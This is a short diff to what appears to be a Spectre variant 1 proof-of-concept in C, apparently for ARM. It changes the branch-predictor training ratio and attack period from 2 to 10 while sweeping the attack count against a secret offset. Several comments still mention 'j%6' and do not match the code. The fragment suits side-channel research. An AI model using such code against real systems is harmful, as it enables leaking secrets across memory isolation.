@@ -67,7 +67,7 @@ void spectre(size_t offset){
 		flushSideChannel();
 		training_x = trial_idx % buffer_size;
 
-		for (j = 1; j <= 2 * attack_times; j++) {
+		for (j = 1; j <= 10 * attack_times; j++) {
 			flush(&buffer_size);
 			for (volatile int z = 0; z < 100; z++){}
 			//asm volatile("DSB SY");
@@ -76,7 +76,7 @@ void spectre(size_t offset){
 			/* Branch misprediction code from spectre POC */
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
 			/* Avoid jumps in case those tip off the branch predictor */
-			x = ((j % 2) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+			x = ((j % 10) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
 			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
 			x = training_x ^ (x & (offset ^ training_x));
 			victim(x);
@@ -111,7 +111,7 @@ int main(int argc, const char**argv){
   asm volatile ("DSB SY");
 
   size_t secret_offset = (size_t)(secret - (char*)buffer);
-  period = 2;
+  period = 10;
   printf("Fixed period = %d\n", period);
   for(int i=0; i<=100; i+=5){ // length of secret is known
     attack_times = i;
